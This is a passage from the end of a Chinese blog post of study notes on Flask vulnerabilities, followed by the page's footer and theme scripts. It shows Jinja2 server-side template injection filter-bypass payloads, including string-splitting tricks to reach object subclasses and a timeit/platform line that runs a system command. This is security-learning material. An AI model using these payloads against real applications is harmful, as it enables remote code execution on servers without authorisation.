+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原poc&#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>].subclasses()&#125;&#125;绕过 &#123;&#123;<span class="string">&quot;&quot;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>][<span class="string">&#x27;subcla&#x27;</span>+<span class="string">&#x27;sses&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（3）过滤class，使用session</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc &#123;&#123;session[<span class="string">&#x27;cla&#x27;</span>+<span class="string">&#x27;ss&#x27;</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].subclasses()[<span class="number">118</span>]&#125;&#125;多个bases[<span class="number">0</span>]是因为一直在向上找<span class="built_in">object</span>类。使用mro就会很方便&#123;&#123;session[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__mro__[<span class="number">12</span>]&#125;&#125;或者request[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>].__mro__[<span class="number">12</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（4）timeit姿势</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeittimeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;,number=1)<span class="keyword">import</span> platformprint platform.popen(&#x27;dir&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>参考文章：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/56614e46093e">flask框架漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000017330435">Python Flask框架：零基础web开发入门教程</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260504.html">Flask框架（jinja2）服务端模板注入漏洞分析（SSTI）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rasang/p/12181654.html">Python——flask漏洞探究</a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rasang/p/12181654.html">https://www.cnblogs.com/Rasang/p/12181654.html</a>)</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Seizer</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://seizer-zyx.github.io/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://seizer-zyx.github.io/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://seizer-zyx.github.io" target="_blank">Seizer</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062123578.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/2021-10/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"><img class="prev-cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062132932.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">第二届西安邮电大学网络安全技能大赛</div></div></a></div><div class="next-post pull-right"><a href="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062110437.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Phar反序列化漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/" title="LAMP和LNMP环境搭建的艰辛历程"><img class="cover" src="https://raw.githubusercontent.com/seizer-zyx/picgo/master/202108292144431.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-10</div><div class="title">LAMP和LNMP环境搭建的艰辛历程</div></div></a></div><div><a href="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/" title="ctfd靶场搭建过程"><img class="cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062124522.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-15</div><div class="title">ctfd靶场搭建过程</div></div></a></div><div><a href="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Phar反序列化漏洞"><img class="cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062110437.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-13</div><div class="title">Phar反序列化漏洞</div></div></a></div><div><a href="/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/" title="XXE漏洞的学习"><img class="cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062110436.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-26</div><div class="title">XXE漏洞的学习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Flask%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">Flask是什么？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Flask%E5%9F%BA%E6%93%8D"><span class="toc-number">2.</span> <span class="toc-text">Flask基操</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Flask"><span class="toc-number">2.1.</span> <span class="toc-text">安装Flask</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99Hello-Flask"><span class="toc-number">2.2.</span> <span class="toc-text">编写Hello,Flask!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8HTML%E6%A8%A1%E6%9D%BF"><span class="toc-number">2.3.</span> <span class="toc-text">使用HTML模板</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Flask%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">Flask框架漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flask%E5%AF%BC%E8%87%B4XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">flask导致XSS漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">SSTI漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.2.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">3.2.2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.3.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Seizer</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.16/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-gitee-calendar-api.vercel.app/api?seizer-zyx";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="seizer-zyx";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style>undefined</style><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.jsdelivr.net/gh/tzy13755126023/BLOG_SOURCE/theme_f/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>
